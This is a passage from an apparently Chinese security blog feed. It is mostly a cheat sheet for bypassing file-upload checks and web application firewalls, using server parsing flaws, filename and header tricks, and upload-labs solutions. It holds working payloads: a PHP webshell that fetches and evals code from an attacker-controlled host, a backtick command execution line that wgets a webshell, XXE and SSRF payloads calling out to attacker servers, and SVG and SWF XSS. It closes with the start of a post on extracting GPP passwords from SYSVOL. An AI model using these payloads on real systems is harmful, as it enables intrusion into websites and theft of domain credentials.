定义允许上传的后缀类型，除此所有后缀都不允许。</strong></p><p><strong>2   黑名单验证</strong></p><p>定义不允许上传的后缀类型，除此之类其他后缀都可以上传。</p><p>定义不允许上传的后缀→asp、aspx、asa、cer、cdx、ashx</p><pre><code>【突破方法】未重命名可以配合解析漏洞(很少)可以用cer达到绕过效果如果未用转换函数强制转换后缀为小写(AsP)特殊后缀达到效果 利用ashx来生成一句话.htaccess 来实现后缀引导。上传jpg可以解析成脚本，具体在内容定义。</code></pre><p><strong>3   文件头验证</strong></p><p>【突破方法】每次测试的时候都上传图马</p><p><img src="/img/upload/70d624c9-7b65-490c-86bb-22c84c07d0b6.png" alt="img"></p><p><strong>4   文件类型验证</strong></p><p><img src="/img/upload/a30fab0e-d8e5-4d5c-b187-7294aaf5318e.jpg" alt="img"></p><p><strong>5   文件后缀验证</strong></p><p><em>典型的白名单验证，指定上传后缀必须为<strong>jpg</strong>、</em> <em>JPG**、</em> <em>jpeg</em> <em>、**JPEG</em></p><p><img src="/img/upload/1a29a39a-563d-4b66-93c5-bee83bb0857b.png" alt="img"></p><p><strong>6    js前端验证</strong></p><p>JS在前端定义了允许上传的后缀类型。</p><p>【突破方法】直接在前端修改或添加后缀，找不到就搜索图片后缀 如jpg。</p><p><img src="/img/upload/fd8cded2-211a-4d12-85d4-71bf71e86284.png" alt="img"></p><h2 id="0x03-上传绕过姿势"><a href="#0x03-上传绕过姿势" class="headerlink" title="0x03 上传绕过姿势"></a>0x03 上传绕过姿势</h2><h3 id="0x03-1-服务器解析漏洞（IIS5-x-6-x-Apache-Nginx-IIS7-0-7-5）"><a href="#0x03-1-服务器解析漏洞（IIS5-x-6-x-Apache-Nginx-IIS7-0-7-5）" class="headerlink" title="0x03-1 服务器解析漏洞（IIS5.x-6.x  Apache  Nginx  IIS7.0/7.5）"></a>0x03-1 服务器解析漏洞（IIS5.x-6.x  Apache  Nginx  IIS7.0/7.5）</h3><h4 id="1-IIS5-x-6-x解析漏洞"><a href="#1-IIS5-x-6-x解析漏洞" class="headerlink" title="1. IIS5.x-6.x解析漏洞"></a>1. IIS5.x-6.x解析漏洞</h4><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p><p>a. 目录解析(6.0)</p><p>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg</a><br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p><p>b. 文件解析</p><p>形式：<a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a><br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p><p>c. 解析文件类型</p><p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p><p>目录解析</p><p><img src="/img/upload/cc79f068-247e-42a8-96a8-9c44a1620666.png" alt="img"></p><p>文件解析</p><p><img src="/img/upload/a262d5e6-d2e4-4d03-8b39-e8c2317087c3.png" alt="img"></p><h4 id="2-apache解析漏洞"><a href="#2-apache解析漏洞" class="headerlink" title="2. apache解析漏洞"></a>2. apache解析漏洞</h4><p>漏洞原理</p><p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p><p>漏洞形式</p><p><a href="http://www.xxxx.xxx.com/test.php.php123" target="_blank" rel="noopener">www.xxxx.xxx.com/test.php.php123</a></p><p>其余配置问题导致漏洞</p><p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p><p>一个文件名为xxxx1.x2.x3的文件（例如：index.php.fuck）， Apache会从x3的位置往x1的位置开始尝试解析，如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样一直往前尝试，直到遇到一个能解析的扩展名为止。<br>WampServer2.0AllVersion(WampServer2.0i/Apache2.2.11)<br>WampServer2.1AllVersion(WampServer2.1e-x32/Apache2.2.17)<br>Wamp5AllVersion(Wamp5_1.7.4/Apache2.2.6)<br>AppServ2.4AllVersion(AppServ-2.4.9/Apache2.0.59)<br>AppServ2.5AllVersion(AppServ-2.5.10/Apache2.2.8)<br>AppServ2.6AllVersion(AppServ-2.6.0/Apache2.2.8)<br>以上集成环境都存在扩展名解析顺序漏洞，并且这些环境都存在对php3文件按照php来解析这个小洞。该方法针对黑名单不全时，能够绕过。<br>总结存在该漏洞的Apache版本：<br>Apache2.0.x&lt;=2.0.59<br>Apache2.2.x&lt;=2.2.17</p><p><img src="/img/upload/be1d77b3-82b8-41d8-99cc-819b5c5690cb.jpg" alt="img"></p><h4 id="3-nginx解析漏洞"><a href="#3-nginx解析漏洞" class="headerlink" title="3. nginx解析漏洞"></a>3. nginx解析漏洞</h4><p><strong>漏洞原理</strong></p><p>　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p><p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p><p><strong>漏洞形式</strong></p><p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a></p><p><img src="/img/upload/526512546.png" alt="img"></p><h4 id="4-IIS7-5解析漏洞"><a href="#4-IIS7-5解析漏洞" class="headerlink" title="4. IIS7.5解析漏洞"></a>4. IIS7.5解析漏洞</h4><p>IS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。（例如：webshell.jpg/x.php）<br>IIS7.0(Win2008R1+IIS7.0)<br>IIS7.5(Win2008R2+IIS7.5)<br>IIS的解析漏洞不像Apache那么模糊，针对IIS6.0，只要文件名不被重命名基本都能搞定。这里要注意一点，对于”任意文件名/任意文件名.php”这个漏洞其实是出现自php-cgi 的漏洞， 所以其实跟IIS自身是无关的。</p><h3 id="0x03-2-文件扩展名绕过（asp-aspx-php-jsp）"><a href="#0x03-2-文件扩展名绕过（asp-aspx-php-jsp）" class="headerlink" title="0x03-2 文件扩展名绕过（asp aspx php jsp）"></a>0x03-2 文件扩展名绕过（asp aspx php jsp）</h3><h4 id="1-asp"><a href="#1-asp" class="headerlink" title="1. asp"></a>1. asp</h4><pre><code>#IIS 5.0/6.0#文件解析.asp;.jpg.asp.jpg.asp;jpg#目录解析.asp/1.jpg------------------------------------------------------------------------------------------------------------------------------------#大小写绕过asPx------------------------------------------------------------------------------------------------------------------------------------#截断1.asp%00.jpg------------------------------------------------------------------------------------------------------------------------------------#空格绕过1.asp .jpg1.asp_.jpg    (_代替空格，只在windows下有效。因为windows系统自动去掉不符合规则符号后面的内容)------------------------------------------------------------------------------------------------------------------------------------#黑名单绕过(替代asp)：IIS6.0 默认的可执行文件除了asp还包含这三种 :asacercdxashxasmx------------------------------------------------------------------------------------------------------------------------------------#IIS put上传------------------------------------------------------------------------------------------------------------------------------------#asaspp------------------------------------------------------------------------------------------------------------------------------------#filename换位置放到content-type的下一行------------------------------------------------------------------------------------------------------------------------------------#+1.asp;+2.jpg------------------------------------------------------------------------------------------------------------------------------------#双文件上传------------------------------------------------------------------------------------------------------------------------------------#RTLO</code></pre><p><img src="/img/upload/49656c3c-6604-4bea-bbea-96970c056e91.png" alt="img"></p><h4 id="2-aspx"><a href="#2-aspx" class="headerlink" title="2. aspx"></a>2. aspx</h4><pre><code>#IIS 5.0/6.0文件解析.aspx;.jpg.aspx.jpg.aspx;jpg------------------------------------------------------------------------------------------------------------------------------------#目录解析.aspx/1.jpg------------------------------------------------------------------------------------------------------------------------------------#截断1.aspx%00.jpg------------------------------------------------------------------------------------------------------------------------------------#大小写绕过asPx------------------------------------------------------------------------------------------------------------------------------------#空格绕过1.aspx .jpg1.aspx_.jpg    (_代替空格，只在windows下有效。因为windows系统自动去掉不符合规则符号后面的内容)------------------------------------------------------------------------------------------------------------------------------------#黑名单绕过(替代aspx)：asacercdxashx            （生成aspx文件，见waf绕过）asmxhtrasax------------------------------------------------------------------------------------------------------------------------------------#IIS put上传------------------------------------------------------------------------------------------------------------------------------------#filename换位置放到content-type的下一行------------------------------------------------------------------------------------------------------------------------------------#垃圾数据filename=&#39;abc.aspx&#39;;aaaaaaaaaaaaaaaaaaaaaaaa------------------------------------------------------------------------------------------------------------------------------------#+1.aspx;+2.jpg------------------------------------------------------------------------------------------------------------------------------------#asaspxpx------------------------------------------------------------------------------------------------------------------------------------#双文件上传------------------------------------------------------------------------------------------------------------------------------------#RTLO</code></pre><h4 id="3-php"><a href="#3-php" class="headerlink" title="3. php"></a>3. php</h4><pre><code>#大小写：pHp------------------------------------------------------------------------------------------------------------------------------------#黑名单绕过(替代php)：php1php2php3php4php5------------------------------------------------------------------------------------------------------------------------------------#空格绕过(只在windows下有效。因为windows系统自动去掉不符合规则符号后面的内容)1.php .1.php. 1.php. .1.php .jpg1.php_.jpg    (_代替空格)1.php.jpg1.php. jpg1.php.  .jpg111.php&amp;amp;#x2e;jpg------------------------------------------------------------------------------------------------------------------------------------#十六进制绕过 点绕过    1.php&amp;#x2e;jpg------------------------------------------------------------------------------------------------------------------------------------#解析漏洞：------------------------------------------------------------------------------------------------------------------------------------1.jpg/.php        (nginx)1.php.123         (apache)1.jpg/php1.jpg/1.php1.jpg%00.php        ------------------------------------------------------------------------------------------------------------------------------------#00截断1.php%00.jpg------------------------------------------------------------------------------------------------------------------------------------#利用不符合windows文件命名规则绕过1.php:1.jpg1.php::$DATA1.php::$DATA……------------------------------------------------------------------------------------------------------------------------------------#回车1.ph回车p------------------------------------------------------------------------------------------------------------------------------------#上传.htaccess:(仅在Apache,例如a_php.gif，会被当成php执行。).htaccess内容&lt;FilesMatch &quot;_php.gif&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;------------------------------------------------------------------------------------------------------------------------------------#IIS put上传------------------------------------------------------------------------------------------------------------------------------------#文件包含绕waf(见6、文件包含绕过)------------------------------------------------------------------------------------------------------------------------------------#垃圾数据filename=&#39;abc.php&#39;;aaaaaaaaaaaaaaaaaaaaaaaa</code></pre><h4 id="4-jsp"><a href="#4-jsp" class="headerlink" title="4. jsp"></a>4. jsp</h4><pre><code>#两个jsp包含中间的jpg.jsp.jpg.jsp------------------------------------------------------------------------------------------------------------------------------------#黑名单绕过(替代jsp)：jspajspsjspxjspf------------------------------------------------------------------------------------------------------------------------------------#put上传（Apache Tomcat 7.0.0 - 7.0.81）%20                        PUT /test1.jsp%20 HTTP/1.1::$DATA                    PUT /test2.jsp::$DATA HTTP/1.1/                            PUT /test3.jsp/ HTTP/1.1.                          PUT /test3.jsp. HTTP/1.1------------------------------------------------------------------------------------------------------------------------------------#垃圾数据filename=&#39;abc.jsp&#39;;aaaaaaaaaaaaaaaaaaaaaaaa------------------------------------------------------------------------------------------------------------------------------------shtml</code></pre><pre><code>#PUT上传代码。有exp可利用PUT /test1.jsp%20 HTTP/1.1Host: localhost:8080User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Connection: closeUpgrade-Insecure-Requests: 1Content-Length: 22&lt;%out.print(&quot;test&quot;);%&gt;</code></pre><h3 id="0x03-3-Content-Disposition、content-type、文件内容检测、双文件"><a href="#0x03-3-Content-Disposition、content-type、文件内容检测、双文件" class="headerlink" title="0x03-3 Content-Disposition、content-type、文件内容检测、双文件"></a>0x03-3 Content-Disposition、content-type、文件内容检测、双文件</h3><h4 id="1-Content-Disposition"><a href="#1-Content-Disposition" class="headerlink" title="1. Content-Disposition"></a>1. Content-Disposition</h4><pre><code>1、将form-data;                                              修改为~form-data        f+orm-data           form-d+ata             Form-data 2、替换form-data 为*                                          即：Content-Disposition:*; name=&quot;file&quot;; filename=&quot;yjh.php&quot; 3、将form-data; name=&quot;file&quot;;                                  分号后面 增加或减少一个空格 4、将Content-Disposition: form-data                           冒号后面 增加或减少一个空格 5、将Content-Disposition                                      修改为content-Disposition(改变大小写)5、filename回车=“1.php”                                       （过阿里云waf）6、filename=”1.php回车&quot;                                        (过百度云waf)7、filename=&quot;1.jpg&quot;;filename=&quot;1.php&quot;                           双参数7、多个Content-Disposition</code></pre><h4 id="2-Content-Type"><a href="#2-Content-Type" class="headerlink" title="2. Content-Type"></a>2. Content-Type</h4><pre><code>php:application/octet-stream1、将Content-Type修改为image/gif，或者其他允许的类型。Content-Type: application/x-www-form-urlencoded;Content-Type: multipart/form-data;Content-Type: application/octet-stream;2、或者删除整行！3、删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。（过安全狗和云锁waf）4、将 Content-Type                 修改为content-Type   5、将 Content-Type: application/octet-stream  冒号后面 增加一个空格6、多个Content-Disposition文件名覆盖（Win2k8 + IIS7.0 + PHP）----------WebKitFormBoundaryFADasdasdasDdasdContent-Disposition: form-data; name=&quot;file&quot;; filename=&#39;abc.php&#39;----------WebKitFormBoundaryFADasdasdasDdasdContent-Disposition: form-data; name=&quot;file&quot;; filename=&#39;abc.jpg&#39;</code></pre><h4 id="3-文件内容"><a href="#3-文件内容" class="headerlink" title="3. 文件内容"></a>3. 文件内容</h4><p>传图马</p><h4 id="4-双文件"><a href="#4-双文件" class="headerlink" title="4. 双文件"></a>4. 双文件</h4><p><img src="/img/upload/3d82e6d1-edd7-4253-80e6-d219a6e81322.png" alt="img"></p><h3 id="0x03-4-客户端绕过"><a href="#0x03-4-客户端绕过" class="headerlink" title="0x03-4 客户端绕过"></a>0x03-4 客户端绕过</h3><p>选择一个禁止上传类型的文件上传，当点击确定按钮之后，浏览器立即弹窗提示禁止上传，一般就可以断定为客户端JavaScript检测，进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测）。</p><p><strong>绕过方法</strong>：</p><ul><li>上传页面，审查元素，修改JavaScript检测函数；</li><li>将需要上传的恶意代码文件类型改为允许上传的类型，例如将dama.asp改为dama.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名dama.jpg改为dama.asp。</li><li>上传webshell.jpg.jsp，可能前端程序检查后缀时，从前面开始检查。</li></ul><h2 id="0x04-WAF绕过"><a href="#0x04-WAF绕过" class="headerlink" title="0x04 WAF绕过"></a>0x04 WAF绕过</h2><h3 id="0x04-1-阿里云WAF绕过"><a href="#0x04-1-阿里云WAF绕过" class="headerlink" title="0x04-1 阿里云WAF绕过"></a>0x04-1 阿里云WAF绕过</h3><pre><code>参考链接：https://www.t00ls.net/articles-51341.htmlContent-Disposition: form-data; name=&quot;upload&quot;; filename===&quot;user1.php&quot;</code></pre><p><img src="/img/upload/c6d05681-15ba-4c1f-b3dd-55d34fe7f9ff.jpg" alt="img"></p><p><img src="/img/upload/453cbfa5-c0cc-4bd8-aff6-0db0c2a755dc.jpg" alt="img"></p><p><img src="/img/upload/727659a3-4d49-4fb7-9f0c-390f631bee93.jpg" alt="img"></p><pre><code>$x=$_get[x];`$x`执行xxx.com?x=wget github的php大马地址</code></pre><h3 id="0x04-2-安全狗"><a href="#0x04-2-安全狗" class="headerlink" title="0x04-2 安全狗"></a>0x04-2 安全狗</h3><pre><code>参考链接：https://www.t00ls.net/articles-51253.html1.===绕过2.去除&quot;&quot;绕过3.少&quot;绕过</code></pre><p><strong>===绕过</strong></p><p><img src="/img/upload/f39eee55-1069-430c-a425-cfb2dcb4e260.jpg" alt="img"></p><p><strong>去除””绕过</strong></p><p><img src="/img/upload/ce0550f8-0aab-4e5c-81e2-2c3a0a10667c.jpg" alt="img"></p><p><strong>少”绕过</strong></p><p><img src="/img/upload/1f72a724-c7e5-431b-8d12-d7d69a319297.jpg" alt="img"></p><p><img src="/img/upload/70170efc-7687-4bac-84e6-505299f26f75.jpg" alt="img"></p><p><img src="/img/upload/0c713a20-bcf5-4f2f-9c1f-24abf517ea3a.jpg" alt="img"></p><p><img src="/img/upload/73fa4d34-fe57-4920-b64c-11900e18e3d2.jpg" alt="img"><img src="/img/upload/2d28758f-5d93-4d3c-bd6d-665ae5dfd6b8.jpg" alt="img"></p><h3 id="0x04-3-百度云"><a href="#0x04-3-百度云" class="headerlink" title="0x04-3 百度云"></a>0x04-3 百度云</h3><p><strong>文件名.php+回车，这样引号就在另一行。同时上传内容的一句话前面加个中文字符</strong></p><p><img src="/img/upload/017328f1-29dd-4c25-9400-dc7cdba1b51d.jpg" alt="img"></p><p><img src="/img/upload/517907359.png" alt="img"></p><p><img src="/img/upload/517934406.png" alt="img"></p><h3 id="0x04-4-云锁"><a href="#0x04-4-云锁" class="headerlink" title="0x04-4 云锁"></a>0x04-4 云锁</h3><pre><code>Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;yjh.C.php&quot;</code></pre><p><img src="/img/upload/518023453.png" alt="img"></p><h3 id="0x04-5-硬waf绕过"><a href="#0x04-5-硬waf绕过" class="headerlink" title="0x04-5 硬waf绕过"></a>0x04-5 硬waf绕过</h3><pre><code># 1. 反斜杠Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;yjh\.php&quot;# 2. form-（无数个）dataContent-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;yjh.php&quot;# 3. 超长文件名Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;yjh（无数个）.php&quot;# 4. -----------------------------30746295935112Content-Disposition: form-data; name=&quot;aaaaa&quotontent-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;zc.php&quot;# 5.垃圾数据filename=&#39;abc.asp&#39;;aaaaaaaaaaaaaaaaaaaaaaaa</code></pre><h2 id="0X05-实战分析"><a href="#0X05-实战分析" class="headerlink" title="0X05 实战分析"></a>0X05 实战分析</h2><h3 id="0x05-1-通过上传zip模板后服务器自解压获取webshell"><a href="#0x05-1-通过上传zip模板后服务器自解压获取webshell" class="headerlink" title="0x05-1 通过上传zip模板后服务器自解压获取webshell"></a>0x05-1 通过上传zip模板后服务器自解压获取webshell</h3><p><img src="/img/upload/518531000.png" alt="img"></p><p><img src="/img/upload/9aa43dbb-7774-4dfb-a733-abb7f0a11764.png" alt="img"></p><p><img src="/img/upload/a4b7b96d-6556-460e-ad23-4c74dd3dee4f.png" alt="img"></p><p><img src="/img/upload/518544781.png" alt="img"></p><p>那么在10000003目录下，就会有我们的大马和一句话木马。</p><h3 id="0x05-2-黑名单绕过之文件名可控"><a href="#0x05-2-黑名单绕过之文件名可控" class="headerlink" title="0x05-2 黑名单绕过之文件名可控"></a>0x05-2 黑名单绕过之文件名可控</h3><p><img src="/img/upload/523227109.png" alt="img"></p><p><img src="/img/upload/523240234.png" alt="img"></p><p><img src="/img/upload/523263781.png" alt="img"></p><p><img src="/img/upload/523290500.png" alt="img"></p><h3 id="0x05-3-高并发绕过上传总结-条件竞争"><a href="#0x05-3-高并发绕过上传总结-条件竞争" class="headerlink" title="0x05-3 高并发绕过上传总结(条件竞争)"></a>0x05-3 高并发绕过上传总结(条件竞争)</h3><p><img src="/img/upload/e0e5a176-e02f-401e-80da-76f981ae0c37.jpg" alt="img"></p><p>2、但是上传后会变成asp_.jpg    php_.jpg    jsp_.jpg</p><p>转折点是前面的命名是以时间命名，文件名是 年月日时分秒到毫秒这种规律来定义的，那么尝试高并发上传</p><p>如果文件名相同会怎么样？报错？还是说服务器不会把%00转换为下划线，而是先重命名为xxxxxxxxxxx(1).asp。</p><p>经过测试发现服务器先重命名为(1).asp了，而不会把%00转换为下划线了。</p><p><img src="/img/upload/36b64bad-0046-49f6-974e-4f1b8fbb04af.jpg" alt="img"></p><p><img src="/img/upload/3ed98cbb-4056-4d5f-991c-a9697d36d444.jpg" alt="img"></p><p>3、这样就成功上传了！然后上传图片马，用shtml去包含图片马路径即可拿到 shell，或者上传免杀的asp马</p><h2 id="0x06-upload-labs过关"><a href="#0x06-upload-labs过关" class="headerlink" title="0x06 upload-labs过关"></a>0x06 upload-labs过关</h2><p>1、前端</p><p>2、修改content-type为image/gif</p><p>3、黑名单：php3,phtml</p><p>4、黑名单：上传.htaccess</p><p>5、黑名单：大小写phP</p><p>6、黑名单：空格</p><p>7、黑名单：点</p><p>8、黑名单：::$DATA</p><p>9、黑名单：info.php. . （点+空格+点）</p><p>10、黑名单：双写</p><p>11、白名单：get型%00截断</p><p>12、白名单：post型%00截断，url解码</p><p>13、上传图片马，配合包含漏洞</p><p>17、条件竞争</p><p>18、条件竞争</p><h2 id="0x07-菜刀连接"><a href="#0x07-菜刀连接" class="headerlink" title="0x07 菜刀连接"></a>0x07 菜刀连接</h2><pre><code>思路参考链接：https://www.t00ls.net/articles-51085.htmlhttps://www.t00ls.net/viewthread.php?tid=49873https://xz.aliyun.com/t/2739?from=timeline&amp;isappinstalled=0</code></pre><p>日常我们遇到的WAF对webshell查杀拦截主要是通过文件内容分析查杀，和网络传输层面的流量分析拦截，以及执行层面的拦截，常见的绕过基本都是花指令的一套，今日研究出来一种新型的绕过方法发出来大家一起讨论。</p><p>目标站：a.com<br>需要准备一个你自己可控外网的主机做跳板 b.com</p><p>a.com 上传muma.php如下：</p><pre><code>&lt;?php$handle = fopen (&quot;http://b.com/bypass.txt&quot;, &quot;rb&quot;);$contents = &quot;&quot;;do {$data = fread($handle, 8192);if (strlen($data) == 0){break;}$contents .= $data;} while(true);fclose ($handle);$c = array();array_push($c,$contents);eval($c[0]);</code></pre><p>b.com 上传l.php</p><pre><code>&lt;?php$bypassFile = fopen(&quot;bypass.txt&quot;, &quot;w&quot;);$code = $_POST[code];fwrite($bypassFile,$code );fclose($bypassFile);print(file_get_contents(&quot;http://a.com/muma.php&quot;));</code></pre><p>菜刀 直接连b.com/l.php 连上去后控制的是a.com</p><p><img src="/img/upload/97b693c7-146f-4176-b4f1-337e7ce088a1.png" alt="img"></p><h2 id="0x08-造洞"><a href="#0x08-造洞" class="headerlink" title="0x08 造洞"></a>0x08 造洞</h2><pre><code>文件上传漏洞：↓    html文件：造出一个xss漏洞    swf文件：造出一个xss漏洞    svg文件：造出一个xss漏洞    pdf文件：造出一个XSS漏洞和URL跳转漏洞    exe文件：钓鱼    mp4，avi文件：ssrf漏洞    任意后缀文件，只要文件内容为xxe：    shtml文件：ssi命令执行    xlsx: xxe漏洞    xml文件：xxe，xss漏洞</code></pre><h3 id="0x08-1-svg文件"><a href="#0x08-1-svg文件" class="headerlink" title="0x08-1 svg文件"></a>0x08-1 svg文件</h3><pre><code># 1.svg&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(1)&quot;/&gt;</code></pre><p><img src="/img/upload/2d6e940c-1e60-4304-9c6e-5cbe1f292cca.png" alt="img"></p><h3 id="0x08-2-swf文件"><a href="#0x08-2-swf文件" class="headerlink" title="0x08-2 swf文件"></a>0x08-2 swf文件</h3><pre><code>http://127.0.0.1/swfupload.swf?movieName=&quot;]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28&quot;xss&quot;%29}}//</code></pre><p><img src="/img/upload/d08b2546-6c46-4f38-aa86-0a21fdd46ac3.png" alt="img"></p><h3 id="0x08-3-任意文件后缀，只要内容是xxe内容"><a href="#0x08-3-任意文件后缀，只要内容是xxe内容" class="headerlink" title="0x08-3 任意文件后缀，只要内容是xxe内容"></a>0x08-3 任意文件后缀，只要内容是xxe内容</h3><pre><code>XXE代码 ：#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http://VPS_IP:VPS_PORT/header.m3u8#EXT-X-ENDLIST</code></pre><p><strong>读取文件payload</strong></p><p><img src="/img/upload/c78a30ca-3699-415b-a3da-aea2d6daf6b3.png" alt="img"></p><pre><code>nc –lvp  8080</code></pre><p><img src="/img/upload/25812427-4388-445b-831b-6724f944fe4b.jpg" alt="img"></p><h3 id="0x08-4-shtml文件-ssi命令执行"><a href="#0x08-4-shtml文件-ssi命令执行" class="headerlink" title="0x08-4 shtml文件 ssi命令执行"></a>0x08-4 shtml文件 ssi命令执行</h3><pre><code>&lt;!--#ECHO var=&quot;SERVER_SOFTWARE&quot;--&gt;&lt;!--#echo var=&quot;server_name&quot; --&gt;&lt;!--#echo var=&quot;remote_user&quot; --&gt;命令参考链接：https://www.secpulse.com/archives/66934.html</code></pre><p><img src="/img/upload/1cea9bcc-4b86-401c-a25a-05b1779ef97e.png" alt="img"></p><p>执行了命令</p><p><img src="/img/upload/47257796.png" alt="img"></p><h3 id="0x08-5-xlsx文件-XXE"><a href="#0x08-5-xlsx文件-XXE" class="headerlink" title="0x08-5 xlsx文件 XXE"></a>0x08-5 xlsx文件 XXE</h3><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &#39;http://xxe.xxxxx.ceye.io&#39;&gt;%remote;]&gt;&lt;root/&gt;Xlsx文件构造：1、 新建一个xlsx文件2、 修改后缀为.zip，并解压3、 打开[Content_Types].xml，在头部加入xxe payload4、 重新压缩当前文件夹为zip，之后修改后缀为xlsx5、 在上传点上传改文件，上传后服务器自动打开文件，触发xxe6、 Dnslog平台查看结果</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组策略之xml保存的密码</title>
      <link href="/2021/02/07/zu-ce-lue-zhi-xml-bao-cun-de-mi-ma/"/>
      <url>/2021/02/07/zu-ce-lue-zhi-xml-bao-cun-de-mi-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="组策略之xml保存的密码"><a href="#组策略之xml保存的密码" class="headerlink" title="组策略之xml保存的密码"></a>组策略之xml保存的密码</h1><p>本文通过GPP引出为什么SYSVOL的xml文件中保存着各种账号密码</p><h2 id="0x01-GPP漏洞介绍"><a href="#0x01-GPP漏洞介绍" class="headerlink" title="0x01 GPP漏洞介绍"></a>0x01 GPP漏洞介绍</h2><p>先介绍下GPP漏洞，GPP全名Group Policy Preferences，组策略首选项。可以通过部署GPP，部署的策略给域成员都添加一个用户或者修改本地用户administrator的密码，达到统一管理本地管理员用户密码的功能。那么这时候域控的SYSVOL共享目录里有一个global.xml里面可能会存放{name,cpasswords}，这个账号密码很可能就是域里面所有机子的本地管理员账号密码。所以只要有一个域用户（域机器的system）权限，使用该域用户net use连接域控，然后net view查看域控的共享目录，再用dir将域控的SYSVOL目录下的所有xml文件列出来，找到Groups.xml文件，查看cpassword字段，解密即可。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>在域控先创建组织，该组织下面的所有域机器都通过GPP管理本地管理员的密码</p><p><img src="/img/gppXml/2c45429c-b5e9-4432-8f29-1c50d7b27309.png" alt="img"></p><p><img src="/img/gppXml/5ccf63be-7602-42f5-a1f3-c09ae512bf99.png" alt="img"></p><p>将一些域机器移动过去</p><p><img src="/img/gppXml/ec3ad5f9-1d2b-4ab2-9cf5-2d61b4117286.png" alt="img"></p><p><img src="/img/gppXml/b5220264-6109-4722-a052-182ba1367658.png" alt="img"></p><p>给GppComputers组织创建组策略</p><p><img src="/img/gppXml/4fedd3aa-13a6-4a00-9842-74e9b83b282c.png" alt="img"></p><p>GPO名字随意</p><p><img src="/img/gppXml/0d1e13a4-6738-439c-bb49-a3e701241705.png" alt="img"></p><p>右键编辑</p><p><img src="/img/gppXml/cf9db0fe-2b09-4785-b87e-762d919167ff.png" alt="img"></p><p>选择本地用户，右键新增，本地使用者</p><p><img src="/img/gppXml/c4d46895-3c33-40f7-9abc-f0ed4504b7a0.png" alt="img"></p><p>密码更改为Gpppassword.</p><p><img src="/img/gppXml/da92379b-8b7c-4d85-ac4d-d4a35bf7e954.png" alt="img"></p><h2 id="0x03-获取密码"><a href="#0x03-获取密码" class="headerlink" title="0x03 获取密码"></a>0x03 获取密码</h2><p>到SYSVOL中查看</p><p><img src="/img/gppXml/cd0cc0f8-8bbb-4601-ad46-4a37abd368c5.png" alt="img"></p><p>在User\Preferences\Groups文件夹下有Groups.xml文件</p><p><img src="/img/gppXml/3186bdd5-9226-43e2-aa70-9749b26cc731.png" alt="img"></p><p>内容如下</p><pre><code>&lt;?xml version=&quot;1.0&quot; 